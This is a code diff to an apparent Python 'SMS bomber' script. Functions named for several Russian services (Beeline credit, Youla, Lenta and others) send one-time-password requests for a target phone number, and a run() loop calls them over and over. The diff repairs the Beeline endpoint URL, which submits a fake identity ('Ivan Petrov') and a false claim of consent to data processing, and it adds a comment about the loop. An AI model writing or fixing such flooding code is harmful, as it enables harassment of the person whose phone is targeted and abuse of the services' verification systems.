@@ -216,13 +216,13 @@ def lenta(phone):
 # timeout 120, used 180
 def beelinecredit(phone):
     blncrdtphn = '8' + '-' + phone[:3] + '-' + phone[3:6] + '-' + phone[6:10]
-
-    response_beelinecredit = requests.post(url='(https://credit-beeline.ru/api/identityproof/'
-                                               'sendonetimepassword)',
+    response_beelinecredit = requests.post(url=('https://credit-beeline.ru/api/identityproof/'
+                                                'sendonetimepassword'),
                                            json={"personalData": {"firstName": "Иван",
                                                  "lastName": "Петров", "middleName": "Романович",
                                                                   "phoneNumber": blncrdtphn},
                                                  "consentToDataProcessing": "true"})
+
     print(response_beelinecredit, response_beelinecredit.content)
 
 def youla(phone):
@@ -270,7 +270,7 @@ def run(phone, n):
         beelinecredit(phone)
         for j in range(3):  # timeout 60
             bk(phone)
-            karusel(phone)
+            karusel(phone)  # выкинуть из цикла
             taxi2412recover(phone)
             otkr(phone)
             for k in range(10):  # timeout 0
